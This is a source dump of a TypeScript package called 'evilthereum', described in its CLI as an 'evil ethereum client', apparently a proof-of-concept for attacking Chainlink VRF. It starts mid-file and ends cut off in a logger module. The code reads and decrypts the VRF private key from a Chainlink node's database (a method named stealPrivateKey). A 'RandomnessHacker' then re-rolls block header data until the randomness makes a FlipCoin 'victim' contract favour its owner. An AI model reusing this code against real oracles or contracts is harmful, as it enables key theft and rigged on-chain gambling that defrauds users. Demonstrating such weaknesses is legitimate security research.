    "@evilink/contracts-flipcoin": "0.1.0",
    "chalk": "^4.1.0",
    "commander": "^6.2.1",
    "dayjs": "^1.10.1",
    "emittery": "^0.8.1",
    "ethereumjs-block": "^2.2.2",
    "ethereumjs-common": "^1.5.2",
    "ethereumjs-tx": "^2.1.2",
    "ethereumjs-vm": "^4.2.0",
    "ganache-core": "^2.13.1",
    "uuid": "^8.3.2",
    "winston": "^3.3.3"
  },
  "devDependencies": {
    "nodemon": "^2.0.6",
    "ts-node": "^9.1.1",
    "typescript": "^4.1.3"
  },
  "license": "MIT"
}

'''
'''--- packages/evilthereum/src/command/index.ts ---
// eslint-disable-next-line import/prefer-default-export
export { default as serve } from './serve'

'''
'''--- packages/evilthereum/src/command/serve.ts ---
import { readFileSync } from 'fs'
import { createServer } from '../core/server'
import logger from '../util/logger'

const action = async (options) => {
  const {
    parent: { chainId, chainDbPath },
    httpPort,
    chainlinkApiDsn,
    chainlinkApiAuthFile,
    chainlinkDatabaseDsn,
    chainlinkVrfKeyPassphraseFile,
    chainlinkMockerKey,
  } = options

  const [apiAuthEmail, apiAuthPassphrase] = readFileSync(chainlinkApiAuthFile)
    .toString('utf-8')
    .split('\n', 2)
  const [vrfKeyPassphrase] = readFileSync(chainlinkVrfKeyPassphraseFile)
    .toString('utf-8')
    .split('\n', 1)

  const server = await createServer({
    chainId: parseInt(chainId, 10),
    chainDbPath,
    chainlink: {
      apiDsn: chainlinkApiDsn,
      apiAuth: {
        email: apiAuthEmail,
        password: apiAuthPassphrase,
      },
      databaseDsn: chainlinkDatabaseDsn,
      vrfKeyPassphrase,
      mockerKey: chainlinkMockerKey,
    },
  })

  server.listen(httpPort, () => {
    logger
      .child({ prefix: 'server' })
      .info(`http server listening on port ${httpPort}`)
  })
}

export default action

'''
'''--- packages/evilthereum/src/core/blockchain.ts ---
import GanacheBlockchain from 'ganache-core/lib/blockchain_double'
import VM from 'ethereumjs-vm'
import Block from 'ethereumjs-block'
import { Transaction } from 'ethereumjs-tx'
import { RunBlockResult } from 'ethereumjs-vm/dist/runBlock'
import { CONTRACT_ADDRESS } from '@evilink/constant'
import { vrfCoordinatorFactory } from '@evilink/contracts-chainlink'
import { hexZeroPad } from '@ethersproject/bytes'
import Emittery from 'emittery'
import RandomnessHacker from './randomness-hacker'
import { RandomnessRequestEvent, RandomnessRequest } from './chainlink/type'
import { decodeRawReceiptLog, copyVm } from '../util/ethereum'
import logger from '../util/logger'

type ProcessBlockResult = RunBlockResult & {
  transactions: Transaction[]
}

type ProcessBlockDryRunResult = ProcessBlockResult & {
  dryRanVm: VM
}

class Blockchain extends GanacheBlockchain {
  static logger = logger.child({ prefix: Blockchain.name })

  static TOPIC_RANDOMNESS_REQUEST = vrfCoordinatorFactory.interface.getEventTopic(
    'RandomnessRequest',
  )

  static findRandomnessRequestEvent(
    result: ProcessBlockResult,
  ): RandomnessRequestEvent | undefined {
    if (result.receipts.length === 0) {
      throw new Error('unexpected empty receipt')
    }
    if (result.receipts.length > 1) {
      throw new Error(
        'multiple transaction in single block is not supported yet',
      )
    }

    const logs = result.receipts[0].logs
      ?.map(decodeRawReceiptLog)
      .filter(
        ({ address, topics: [topic] }) =>
          address === CONTRACT_ADDRESS.VRF_COORDINATOR &&
          topic === Blockchain.TOPIC_RANDOMNESS_REQUEST,
      )
    if (logs.length > 1) {
      throw new Error(
        'multiple randomness reuqested in single transaction is not supported yet',
      )
    }

    if (logs.length === 1) {
      const { args: event } = vrfCoordinatorFactory.interface.parseLog(logs[0])
      return {
        keyHash: event[0],
        preSeed: hexZeroPad(event[1], 32),
        senderAddress: event[3].toLowerCase(),
        fee: event[4],
        requestId: event[5],
      }
    }

    return undefined
  }

  private randomnessHacker: RandomnessHacker

  private emittery: Emittery<{
    randomnessRequest: RandomnessRequest
  }>

  constructor(options, randomnessHacker: RandomnessHacker) {
    super(options)
    this.randomnessHacker = randomnessHacker
    this.emittery = new Emittery()
  }

  async processBlock(
    vm: VM,
    block: Block,
    commit: boolean,
    callback: (...args: any[]) => any,
  ) {
    Blockchain.logger.trace(`processBlock: ${JSON.stringify(block, null, 2)}`)

    try {
      const { dryRanVm, ...result } = await this.processBlockDryRun(
        copyVm(vm),
        block,
      )

      const randomnessRequestEvent = Blockchain.findRandomnessRequestEvent(
        result,
      )
      if (randomnessRequestEvent) {
        // eslint-disable-next-line no-param-reassign
        block.header.stateRoot = dryRanVm.stateManager._trie.root
        const randomnessRequest = {
          block,
          event: randomnessRequestEvent,
        }

        await this.randomnessHacker.hack(dryRanVm, randomnessRequest)

        this.emittery.emit('randomnessRequest', randomnessRequest)
      }
    } catch (error) {
      Blockchain.logger.error(`processBlock: ${error}`)
    }

    await super.processBlock(vm, block, commit, callback)
  }

  async processBlockDryRun(
    vm: VM,
    block: Block,
  ): Promise<ProcessBlockDryRunResult> {
    return new Promise<ProcessBlockDryRunResult>((resolve, reject) => {
      super.processBlock(
        vm,
        block,
        false,
        (
          vmerr: any,
          transactions: Transaction[],
          runBlockResult: RunBlockResult,
        ) => {
          if (vmerr) {
            reject(vmerr)
          } else {
            resolve({ dryRanVm: vm, transactions, ...runBlockResult })
          }
        },
      )
    })
  }

  onRandomnessRequest(callback: (data: RandomnessRequest) => void) {
    this.emittery.on('randomnessRequest', callback)
  }
}

export default Blockchain

'''
'''--- packages/evilthereum/src/core/chainlink/index.ts ---
/* eslint-disable no-await-in-loop, no-constant-condition */
import { Wallet } from '@ethersproject/wallet'
import { CONTRACT_ADDRESS } from '@evilink/constant'
import { vrfCoordinatorFactory } from '@evilink/contracts-chainlink'
import { publicKey, compressed } from '@evilink/chainlink-vrf'
import { ChainlinkOrm, IChainlinkOrm } from '@evilink/chainlink-orm'
import {
  ChainlinkClient,
  IChainlinkClient,
  JobSpecReq,
  SessionReq,
} from '@evilink/chainlink-client'
import { IChainlink } from './type'
import { retryUntilSuccess } from '../../util/retry'
import logger from '../../util/logger'

export type ChainlinkOptions = {
  apiDsn?: string
  apiAuth?: SessionReq
  databaseDsn?: string
  vrfKeyPassphrase?: string
}

export class Chainlink extends IChainlink {
  static logger = logger.child({ prefix: Chainlink.name })

  static readonly VRF_KEY_PASSPHREASE_PREFIX = `don't mix VRF and Ethereum keys!`

  static readonly RANDOMNESS_JOB_SPEC_NAME = 'evilink_randomness'

  private options: ChainlinkOptions

  private orm: IChainlinkOrm

  private client: IChainlinkClient

  constructor(options: ChainlinkOptions) {
    super()
    this.options = options
  }

  async initialize(): Promise<void> {
    await retryUntilSuccess(() => this.stealPrivateKey(), 3e3, {
      beforeEach: () =>
        Chainlink.logger.info(
          'try connect to chainlink database to steal private key',
        ),
      afterFailure: (error) => {
        Chainlink.logger.debug(`stealPrivateKey error: ${error}`)
        Chainlink.logger.info(
          'failed to connect to chainlink database, retry 3 seconds later...',
        )
      },
    })
    await retryUntilSuccess(() => this.ensureJobSpec(), 3e3, {
      beforeEach: () =>
        Chainlink.logger.info('try connect to chainlink api to ensure job id'),
      afterFailure: (error) => {
        Chainlink.logger.debug(`ensureJobSpec error: ${error}`)
        Chainlink.logger.info(
          'failed to connect to chainlink api, retry 3 seconds later...',
        )
      },
    })
  }

  private async stealPrivateKey(): Promise<Wallet> {
    // Steal key from chainlink database
    if (!this.orm) {
      this.orm = await ChainlinkOrm.connect(this.options.databaseDsn)
    }

    const keys = await this.orm.listEncryptedVRFKeys()
    if (keys.length === 0) {
      throw new Error('failed to find any encrypted vrf keys')
    }

    const wallet = Wallet.fromEncryptedJsonSync(
      keys[0].vrf_key,
      `${Chainlink.VRF_KEY_PASSPHREASE_PREFIX}${this.options.vrfKeyPassphrase}`,
    )

    this._key = wallet.privateKey
    return wallet
  }

  private async ensureJobSpec() {
    // Retrieve randomness service jobId
    if (!this.client) {
      this.client = await ChainlinkClient.authenticate(
        this.options.apiDsn,
        this.options.apiAuth,
      )
    }
    const { data: jobSpecs } = await this.client.listJobSpec()
    let jobId = jobSpecs.find(
      ({ attributes }) =>
        attributes.name === Chainlink.RANDOMNESS_JOB_SPEC_NAME,
    )?.id
    if (!jobId) {
      jobId = (
        await this.client.createJobSpec(this.generateRandomnessJobSpec())
      )?.data?.id
    }

    this._jobId = jobId
  }

  private generateRandomnessJobSpec(): JobSpecReq {
    return {
      name: Chainlink.RANDOMNESS_JOB_SPEC_NAME,
      initiators: [
        {
          type: 'RandomnessLog',
          params: {
            address: CONTRACT_ADDRESS.VRF_COORDINATOR,
          },
        },
      ],
      tasks: [
        {
          type: 'Random',
          params: {
            publicKey: compressed(publicKey(this._key)),
          },
          confirmations: 0,
        },
        {
          type: 'EthTx',
          params: {
            address: CONTRACT_ADDRESS.VRF_COORDINATOR,
            functionSelector: vrfCoordinatorFactory.interface.getSighash(
              'fulfillRandomnessRequest',
            ),
            format: 'preformatted',
          },
          confirmations: 0,
        },
      ],
    }
  }
}

export { IChainlink } from './type'
export { ChainlinkMocker } from './mocker'

'''
'''--- packages/evilthereum/src/core/chainlink/mocker.ts ---
import GanacheStateManager from 'ganache-core/lib/statemanager'
import { BigNumber } from '@ethersproject/bignumber'
import { Wallet } from '@ethersproject/wallet'
import { CONTRACT_ADDRESS, GAS_LIMIT } from '@evilink/constant'
import { vrfCoordinatorFactory } from '@evilink/contracts-chainlink'
import { RandomnessRequest, IChainlink } from './type'
import logger from '../../util/logger'

export class ChainlinkMocker extends IChainlink {
  static logger = logger.child({ prefix: ChainlinkMocker.name })

  private chainId: number

  private stateManager: GanacheStateManager

  constructor(key: string, chainId: number) {
    super({ key, jobId: '0'.repeat(32) })
    this.chainId = chainId
  }

  async initialize(ganacheProvider): Promise<void> {
    this.stateManager = ganacheProvider.manager.state
  }

  async onRandomnessRequest(
    randomnessReqest: RandomnessRequest,
  ): Promise<void> {
    if (!this.stateManager) {
      throw new Error('unexpected called before setStateManager')
    }

    const { packedForContractInput: proof } = this.generateProof(
      randomnessReqest.event.preSeed,
      randomnessReqest.block.header.hash().toString('hex'),
      BigNumber.from(randomnessReqest.block.header.number).toNumber(),
    )

    const randomWallet = Wallet.createRandom()
    const signedTx = await randomWallet.signTransaction({
      from: randomWallet.address,
      nonce: 0,
      gasLimit: GAS_LIMIT,
      value: 0,
      data: vrfCoordinatorFactory.interface.encodeFunctionData(
        vrfCoordinatorFactory.interface.getFunction('fulfillRandomnessRequest'),
        [proof],
      ),
      to: CONTRACT_ADDRESS.VRF_COORDINATOR,
      chainId: this.chainId,
    })
    return new Promise((resolve, reject) => {
      this.stateManager.queueRawTransaction(signedTx, (error, txHash) => {
        if (error) {
          reject(error)
        }
        ChainlinkMocker.logger.info(
          `successfully fulfill randomness request in tx with hash ${txHash}`,
        )
        resolve(txHash)
      })
    })
  }
}

export default ChainlinkMocker

'''
'''--- packages/evilthereum/src/core/chainlink/type.ts ---
import Block from 'ethereumjs-block'
import {
  generateProof,
  publicKey,
  Proof,
  PublicKey,
} from '@evilink/chainlink-vrf'
import { BigNumber } from '@ethersproject/bignumber'
import logger from '../../util/logger'

export type RandomnessRequestEvent = {
  keyHash: string
  preSeed: string
  senderAddress: string
  fee: BigNumber
  requestId: string
}

export type RandomnessRequest = {
  block: Block
  event: RandomnessRequestEvent
}

export type IChainlinkOptions = {
  key: string
  jobId: string
}

export abstract class IChainlink {
  static logger = logger.child({ prefix: IChainlink.name })

  protected _key: string

  protected _jobId: string

  constructor(options?: IChainlinkOptions) {
    this._key = options?.key
    this._jobId = options?.jobId
  }

  jobId(): string {
    return this._jobId
  }

  publicKey(): PublicKey {
    return publicKey(this._key)
  }

  keyHash(): string {
    return publicKey(this._key).hash
  }

  generateProof(
    preSeed: string,
    blockHash: string,
    blockNumber: number,
  ): Proof {
    if (!this._key) {
      throw new Error('unexpected usage before initizlie')
    }
    return generateProof(this._key, preSeed, blockHash, blockNumber)
  }

  abstract initialize(ganacheProvider): Promise<void>
}

export default IChainlink

'''
'''--- packages/evilthereum/src/core/migration.ts ---
import GanacheGethApiDouble from 'ganache-core/lib/subproviders/geth_api_double'
import { Web3Provider, TransactionReceipt } from '@ethersproject/providers'
import { Wallet } from '@ethersproject/wallet'
import { HashZero, WeiPerEther } from '@ethersproject/constants'
import { hexlify } from '@ethersproject/bytes'
import { randomBytes } from '@ethersproject/random'
import { toUtf8String } from '@ethersproject/strings'
import {
  deployChainlinkStack,
  vrfCoordinatorFactory,
} from '@evilink/contracts-chainlink'
import { faucetFactory } from '@evilink/contracts-faucet'
import { flipCoinFactory } from '@evilink/contracts-flipcoin'
import {
  ONE_MILLION_ETHER,
  GENESIS_PRIVATE_KEY,
  CONTRACT_ADDRESS,
} from '@evilink/constant'
import { IChainlink } from './chainlink'
import logger from '../util/logger'

class Migration {
  static logger = logger.child({ prefix: Migration.name })

  static async ensureTxSuccess<
    Tx extends Promise<{ wait: () => Promise<TransactionReceipt> }>
  >(tx: Tx): Promise<void> {
    const receipt = await (await tx).wait()
    if (receipt.status !== 1) {
      throw new Error(`migration transaction failed, receipt: ${receipt}`)
    }
  }

  private provider: Web3Provider

  private wallet: Wallet

  private chainlink: IChainlink

  constructor(ganacheProvider, chainlink: IChainlink) {
    this.provider = new Web3Provider(ganacheProvider)
    this.wallet = new Wallet(GENESIS_PRIVATE_KEY).connect(this.provider)
    this.chainlink = chainlink
  }

  async migrate(): Promise<void> {
    await this.ensureGenesisContracts()
    await this.ensureProvingKeyRegistered()
    await this.ensureFlipCoinKeyHashSet()
  }

  async ensureGenesisContracts(): Promise<void> {
    const allDeployed = await Promise.all(
      Object.values(CONTRACT_ADDRESS).map((address) =>
        address ? this.provider.getCode(address) : Promise.resolve('0x'),
      ),
    ).then((codes) => codes.every((code) => code !== '0x'))

    if (!allDeployed) {
      await this.deployGenesisContracts()
    }
  }

  async deployGenesisContracts(): Promise<void> {
    // Deloy Faucet
    const faucet = await faucetFactory.deploy(this.wallet)

    // Deloy MockLinkToken, VRFCoordinator
    const { mockLinkToken, vrfCoordinator } = await deployChainlinkStack(
      this.wallet,
    )

    // Deloy FlipCoin
    const flipCoin = await flipCoinFactory.deploy(
      this.wallet,
      vrfCoordinator.address,
      mockLinkToken.address,
      HashZero,
    )

    // Send all ether to Faucet
    await Migration.ensureTxSuccess(
      this.wallet.sendTransaction({
        to: faucet.address,
        value: ONE_MILLION_ETHER,
      }),
    )

    // Withdraw 1 ether to FlipCoin
    await Migration.ensureTxSuccess(
      faucet.withdrawTo(flipCoin.address, WeiPerEther),
    )

    const addressesToCheck = {
      Faucet: {
        expectedAddress: CONTRACT_ADDRESS.FAUCET,
        address: faucet.address,
      },
      Link: {
        expectedAddress: CONTRACT_ADDRESS.LINK,
        address: mockLinkToken.address,
      },
      VRFCoordinator: {
        expectedAddress: CONTRACT_ADDRESS.VRF_COORDINATOR,
        address: vrfCoordinator.address,
      },
      FlipCoin: {
        expectedAddress: CONTRACT_ADDRESS.FLIP_COIN,
        address: flipCoin.address,
      },
    }
    const mismatched = Object.entries(addressesToCheck).find(
      ([, { expectedAddress, address }]) =>
        expectedAddress !== address.toLowerCase(),
    )
    if (mismatched) {
      throw new Error(
        `unexpected genesis contracts ${mismatched[0]} address mismatched, expected ${mismatched[1].expectedAddress} but got ${mismatched[1].address}, please cleanup chaindb and restart again`,
      )
    }

    Migration.logger.info('successfully deploy genesis contracts')
    Object.entries(addressesToCheck).forEach(
      ([contract, { expectedAddress }]) => {
        Migration.logger.info(`${contract} address: ${expectedAddress}`)
      },
    )
  }

  async ensureProvingKeyRegistered(): Promise<void> {
    const {
      hash: keyHash,
      x: publicKeyX,
      y: publicKeyY,
    } = this.chainlink.publicKey()
    const jobId = this.chainlink.jobId()

    const vrfCoordinator = vrfCoordinatorFactory
      .attach(CONTRACT_ADDRESS.VRF_COORDINATOR)
      .connect(this.wallet)
    const { jobID: registeredJobId } = await vrfCoordinator.serviceAgreements(
      keyHash,
    )
    if (registeredJobId === HashZero) {
      await Migration.ensureTxSuccess(
        vrfCoordinator.registerProvingKey(
          0,
          hexlify(randomBytes(20)),
          [publicKeyX, publicKeyY],
          Buffer.from(jobId, 'utf-8'),
        ),
      )
    } else if (jobId !== toUtf8String(registeredJobId)) {
      throw new Error(
        'unexpected key hash registered with different job id, please cleanup chaindb and restart again',
      )
    }

    const rpcChainlinkRandomServiceRes = JSON.stringify({
      vrfCoordinatorAddress: CONTRACT_ADDRESS.VRF_COORDINATOR,
      linkAddress: CONTRACT_ADDRESS.LINK,
      jobId,
      keyHash,
    })
    GanacheGethApiDouble.prototype.chainlink_randomService = (callback) => {
      callback(null, rpcChainlinkRandomServiceRes)
    }

    Migration.logger.info('successfully register proving key')
  }

  async ensureFlipCoinKeyHashSet(): Promise<void> {
    const flipCoin = flipCoinFactory
      .attach(CONTRACT_ADDRESS.FLIP_COIN)
      .connect(this.wallet)
    const keyHash = await flipCoin.keyHash()
    if (keyHash !== this.chainlink.keyHash()) {
      await Migration.ensureTxSuccess(
        flipCoin.setKeyHash(this.chainlink.keyHash()),
      )
    }

    Migration.logger.info('successfully set FlipCoin keyHash')
  }
}

export default Migration

'''
'''--- packages/evilthereum/src/core/randomness-hacker/flipcoin.ts ---
import VM from 'ethereumjs-vm'
import { BigNumber } from '@ethersproject/bignumber'
import { hexlify } from '@ethersproject/bytes'
import { flipCoinFactory } from '@evilink/contracts-flipcoin'
import { Victim, ResultChecker } from './type'
import { RandomnessRequest } from '../chainlink/type'
import { hashToAddress, genTxOptsFromRandom } from '../../util/ethereum'

class FlipCoin implements ResultChecker {
  // eslint-disable-next-line class-methods-use-this
  async checkResult(
    vm: VM,
    futureVm: VM,
    victim: Victim,
    randomnessRequest: RandomnessRequest,
  ): Promise<boolean> {
    const player = await FlipCoin.getPlayer(vm, victim, randomnessRequest)
    const balanceOfPlayer = await FlipCoin.getBalanceOfPlayer(
      vm,
      victim,
      player.address,
    )
    const futureBalanceOfPlayer = await FlipCoin.getBalanceOfPlayer(
      futureVm,
      victim,
      player.address,
    )

    return (
      (player.isOwner && futureBalanceOfPlayer.gt(balanceOfPlayer)) ||
      (!player.isOwner && futureBalanceOfPlayer.eq(balanceOfPlayer))
    )
  }

  static async getPlayer(
    vm: VM,
    victim: Victim,
    randomnessRequest: RandomnessRequest,
  ) {
    let result = await vm.runTx(
      await genTxOptsFromRandom(
        flipCoinFactory.interface.getSighash('owner'),
        victim.address,
        vm.opts.common,
      ),
    )
    const ownerAddress = hashToAddress(hexlify(result.execResult.returnValue))

    result = await vm.runTx(
      await genTxOptsFromRandom(
        flipCoinFactory.interface.encodeFunctionData(
          flipCoinFactory.interface.getFunction('playerOf'),
          [randomnessRequest.event.requestId],
        ),
        victim.address,
        vm.opts.common,
      ),
    )
    const playerAddress = hashToAddress(hexlify(result.execResult.returnValue))

    return {
      address: playerAddress,
      isOwner: playerAddress === ownerAddress,
    }
  }

  static async getBalanceOfPlayer(
    vm: VM,
    victim: Victim,
    playerAddress: string,
  ) {
    const result = await vm.runTx(
      await genTxOptsFromRandom(
        flipCoinFactory.interface.encodeFunctionData(
          flipCoinFactory.interface.getFunction('balanceOf'),
          [playerAddress],
        ),
        victim.address,
        vm.opts.common,
      ),
    )
    const balanceOfPlayer = BigNumber.from(result.execResult.returnValue)

    return balanceOfPlayer
  }
}

export default FlipCoin

'''
'''--- packages/evilthereum/src/core/randomness-hacker/index.ts ---
/* eslint-disable no-param-reassign, no-await-in-loop, no-constant-condition */

import VM from 'ethereumjs-vm'
import Block from 'ethereumjs-block'
import GanacheGethApiDouble from 'ganache-core/lib/subproviders/geth_api_double'
import { BigNumber } from '@ethersproject/bignumber'
import { randomBytes } from '@ethersproject/random'
import { CONTRACT_ADDRESS } from '@evilink/constant'
import { vrfCoordinatorFactory } from '@evilink/contracts-chainlink'
import { VictimKind, Victim, ResultChecker } from './type'
import { IChainlink } from '../chainlink'
import { RandomnessRequest } from '../chainlink/type'
import FlipCoin from './flipcoin'
import {
  hexToBuffer,
  bufferToHex,
  genTxOptsFromRandom,
  copyVm,
} from '../../util/ethereum'
import logger from '../../util/logger'

class RandomnessHacker {
  static logger = logger.child({ prefix: RandomnessHacker.name })

  static async fulfillRandomness(victimBlock: Block, vm: VM, proof: string) {
    const nextHeader = new Block.Header()
    nextHeader.number = hexToBuffer(
      BigNumber.from(victimBlock.header.number).add(1).toHexString(),
    )

    const { getBlock } = vm.blockchain
    vm.blockchain.getBlock = (number, done) => {
      if (
        // @ts-ignore
        number.toNumber() ===
        BigNumber.from(victimBlock.header.number).toNumber()
      ) {
        done(undefined, victimBlock)
        return
      }
      getBlock(number, (...args) => {
        done(...args)
      })
    }
    await vm.runTx(
      await genTxOptsFromRandom(
        vrfCoordinatorFactory.interface.encodeFunctionData(
          vrfCoordinatorFactory.interface.getFunction(
            'fulfillRandomnessRequest',
          ),
          [proof],
        ),
        CONTRACT_ADDRESS.VRF_COORDINATOR,
        vm.opts.common,
        new Block([nextHeader, [], []]),
      ),
    )
  }

  private chainlink: IChainlink

  private resultCheckers: Record<VictimKind, ResultChecker>

  private readonly wellKnownVictims: Record<string, Victim>

  private victims: Record<string, Victim>

  constructor(chainlink: IChainlink) {
    this.chainlink = chainlink
    this.resultCheckers = {
      flipcoin: new FlipCoin(),
    }
    this.wellKnownVictims = {
      [CONTRACT_ADDRESS.FLIP_COIN]: {
        address: CONTRACT_ADDRESS.FLIP_COIN,
        kind: 'flipcoin',
      },
    }
    this.victims = {}

    GanacheGethApiDouble.prototype.chainlink_addVictim = (
      optionStr: string,
      callback,
    ) => {
      const victim: Victim = JSON.parse(optionStr)
      this.victims[victim.address] = victim
      callback(null, true)
    }
  }

  async hack(vm: VM, randomnessRequest: RandomnessRequest) {
    if (randomnessRequest.event.keyHash !== this.chainlink.keyHash()) {
      return
    }

    const victim = this.victim(randomnessRequest.event.senderAddress)
    if (!victim) {
      return
    }

    const { header } = randomnessRequest.block
    let attempCount = 0
    RandomnessHacker.logger.info(
      `start to hack victim, address: ${victim.address}, kind: ${victim.kind}`,
    )

    while (true) {
      attempCount += 1
      header.extraData = Buffer.from(randomBytes(32))
      RandomnessHacker.logger.info(`try hash: ${bufferToHex(header.hash())}`)

      const { packedForContractInput: proof } = this.chainlink.generateProof(
        randomnessRequest.event.preSeed,
        header.hash().toString('hex'),
        BigNumber.from(header.number).toNumber(),
      )

      const futureVm = copyVm(vm)
      await RandomnessHacker.fulfillRandomness(
        new Block([header, [], []]),
        futureVm,
        proof,
      )

      if (
        await this.resultCheckers[victim.kind].checkResult(
          copyVm(vm),
          futureVm,
          victim,
          randomnessRequest,
        )
      ) {
        break
      }
    }

    RandomnessHacker.logger.info(
      `successfully hacked with ${attempCount} attemp, hash: ${bufferToHex(
        header.hash(),
      )}`,
    )
  }

  victim(address: string): Victim {
    return this.wellKnownVictims[address] || this.victims[address]
  }
}

export default RandomnessHacker

'''
'''--- packages/evilthereum/src/core/randomness-hacker/type.ts ---
import VM from 'ethereumjs-vm'
import { RandomnessRequest } from '../chainlink/type'

export type VictimKind = 'flipcoin'

export type Victim = {
  address: string
  kind: VictimKind
}

export abstract class ResultChecker {
  abstract checkResult(
    vm: VM,
    futureVm: VM,
    victim: Victim,
    randomnessRequest: RandomnessRequest,
  ): Promise<boolean>
}

'''
'''--- packages/evilthereum/src/core/server.ts ---
import ganache from 'ganache-core'
import {
  ONE_MILLION_ETHER,
  GENESIS_PRIVATE_KEY,
  GAS_LIMIT,
} from '@evilink/constant'
import StateManager from './state-manager'
import Blockchain from './blockchain'
import Migration from './migration'
import RandomnessHacker from './randomness-hacker'
import {
  Chainlink,
  ChainlinkMocker,
  ChainlinkOptions,
  IChainlink,
} from './chainlink'
import rootLogger from '../util/logger'

const logger = rootLogger.child({ prefix: 'server' })

export type CreateServerOption = {
  chainId: number
  chainDbPath: string
  chainlink: ChainlinkOptions & { mockerKey?: string }
}

export const createServer = async (
  options: CreateServerOption,
): Promise<ganache.Server> => {
  const ganacheOptions = {
    debug: process.env.NODE_ENV !== 'production',
    logger: { log: (msg) => logger.trace(msg) },
    ws: true,
    gasPrice: 0,
    db_path: options.chainDbPath,
    network_id: options.chainId,
    _chainId: options.chainId,
    _chainIdRpc: options.chainId,
    gasLimit: GAS_LIMIT,
  }

  let chainlink: IChainlink
  if (options.chainlink.mockerKey) {
    chainlink = new ChainlinkMocker(
      options.chainlink.mockerKey,
      options.chainId,
    )
  } else {
    chainlink = new Chainlink(options.chainlink)
  }

  const randomnessHacker = new RandomnessHacker(chainlink)
  const blockchain = new Blockchain(ganacheOptions, randomnessHacker)

  const server = ganache.server({
    ...ganacheOptions,
    // @ts-ignore
    state: new StateManager({
      ...ganacheOptions,
      accounts: [
        {
          secretKey: GENESIS_PRIVATE_KEY,
          balance: ONE_MILLION_ETHER.toString(),
        },
      ],
      blockchain,
    }),
  })

  const success = chainlink
    .initialize(server.provider)
    .then(() => new Migration(server.provider, chainlink).migrate())

  if (chainlink instanceof ChainlinkMocker) {
    await success
    blockchain.onRandomnessRequest((randomnessRequest) =>
      (chainlink as ChainlinkMocker).onRandomnessRequest(randomnessRequest),
    )
  }

  return server
}

'''
'''--- packages/evilthereum/src/core/state-manager.ts ---
import GanacheStateManager from 'ganache-core/lib/statemanager'
import Blockchain from './blockchain'

type StateManagerOption = Record<string, any> & {
  blockchain: Blockchain
}

class StateManager extends GanacheStateManager {
  public blockchain: Blockchain

  constructor({ blockchain, ...options }: StateManagerOption) {
    super(options)
    this.blockchain = blockchain
  }
}

export default StateManager

'''
'''--- packages/evilthereum/src/index.ts ---
import { Command } from 'commander'
import { serve } from './command'

// eslint-disable-next-line import/prefer-default-export
export const createProgram = () => {
  const program = new Command()
    .name('evilthereum')
    .description('evil ethereum client')
    .version('0.1.0', '-v, --version')
    .option('--chain-id <chain_id>', 'chain id', process.env.CHAIN_ID || '3777')
    .option(
      '--chain-db-path <chain_db_path>',
      'chain db path',
      process.env.CHAIN_DB_PATH || '.evilthereum/chaindb',
    )

  program
    .command('serve')
    .description('start ganache and listen on port <http_port>')
    .option(
      '--http-port <http_port>',
      'http port to serve',
      process.env.HTTP_PORT || '8577',
    )
    .option(
      '--chainlink-api-dsn <chainlink_api_dsn>',
      'chainlink api data source name',
      process.env.CHAINLINK_API_DSN || 'http://localhost:6688',
    )
    .option(
      '--chainlink-api-auth-file <chainlink_api_auth_file>',
      'chainlink api auth file',
      process.env.CHAINLINK_API_AUTH_FILE || '.chainlink/secret/api.txt',
    )
    .option(
      '--chainlink-database-dsn <chainlink_database_dsn>',
      'chainlink database data source name',
      process.env.CHAINLINK_DATABASE_DSN || '',
    )
    .option(
      '--chainlink-vrf-key-passphrase-file <chainlink_vrf_key_passphrase_file>',
      'chainlink vrf key passphrase file',
      process.env.CHAINLINK_VRF_KEY_PASSPHRASE_FILE ||
        '.chainlink/secret/passphrase.txt',
    )
    .option(
      '--chainlink-mocker-key <chainlink_mocker-key>',
      'chainlink mocker key for mocking random service',
      process.env.CHAINLINK_MOCKER_KEY || '',
    )
    .action(serve)

  return program
}

if (require.main === module) {
  const program = createProgram()
  program.exitOverride((err) => {
    switch (err.code) {
      // Ignore parse error
      case 'commander.helpDisplayed':
      case 'commander.help':
        break
      default:
        // eslint-disable-next-line no-console
        console.log('')
        program.outputHelp()
    }
  })
  program.parse(process.argv)
}

'''
'''--- packages/evilthereum/src/util/ethereum.ts ---
import VM from 'ethereumjs-vm'
import Common from 'ethereumjs-common'
import Block from 'ethereumjs-block'
import { Transaction } from 'ethereumjs-tx'
import { RunTxOpts } from 'ethereumjs-vm/dist/runTx'
import { Wallet } from '@ethersproject/wallet'
import { GAS_LIMIT } from '@evilink/constant'

export const bufferToHex = (buffer: Buffer): string =>
  `0x${buffer.toString('hex')}`

export const remove0xPrefix = (hex: string): string =>
  new RegExp(`^(0x)?([a-f0-9]*)$`, 'i').exec(hex)?.[2] ?? ''

export const hexToBuffer = (hex: string): Buffer =>
  Buffer.from(remove0xPrefix(hex), 'hex')

export const hashToAddress = (hash: string): string => `0x${hash.substr(-40)}`

export type Log = {
  address: string
  topics: string[]
  data: string
}

export const decodeRawReceiptLog = (
  rawReceiptLog: [Buffer, Buffer[], Buffer],
): Log => {
  const [address, topics, data] = rawReceiptLog
  return {
    address: bufferToHex(address),
    topics: topics.map(bufferToHex),
    data: bufferToHex(data),
  }
}

export const copyVm = (vm: VM): VM => {
  const copied = vm.copy()
  // @ts-ignore
  copied.blockchain = { ...copied.blockchain }
  return copied
}

export const genTxOptsFromRandom = async (
  data: string,
  to: string,
  common: Common,
  block?: Block,
): Promise<RunTxOpts> => {
  const randomWallet = Wallet.createRandom()
  return {
    tx: new Transaction(
      await randomWallet.signTransaction({
        from: randomWallet.address,
        nonce: 0,
        gasLimit: GAS_LIMIT,
        gasPrice: 0,
        value: 0,
        data,
        to,
        chainId: common.chainId(),
      }),
      { common },
    ),
    skipNonce: true,
    skipBalance: true,
    block,
  }
}

'''
'''--- packages/evilthereum/src/util/logger.ts ---
/* eslint-disable no-param-reassign */
import { format as fmt } from 'util'
import * as winston from 'winston'
import { transports, loggers, format } from 'winston'
import dayjs from 'dayjs'
import chalk from 'chalk'

declare module 'winston' {
  interface Logger {
    trace: winston.LeveledLogMethod
  }
}

const LEVEL = {
  PANIC: 'panic',
  FATAL: 'fatal',
  ERROR: 'error',
  WARN: 'warn',
  INFO: 'info',
  DEBUG: 'debug',
  TRACE: 'trace',
}

const LEVEL_NUMBER = {
  [LEVEL.PANIC]: 0,
  [LEVEL.FATAL]: 1,
  [LEVEL.ERROR]: 2,
  [LEVEL.WARN]: 3,
  [LEVEL.INFO]: 4,
  [LEVEL.DEBUG]: 5,
  [LEVEL.TRACE]: 6,
}

const COLORIZED_LEVEL = {
  [LEVEL.PANIC]: chalk.red(`${LEVEL.PANIC.toUpperCase()}`),
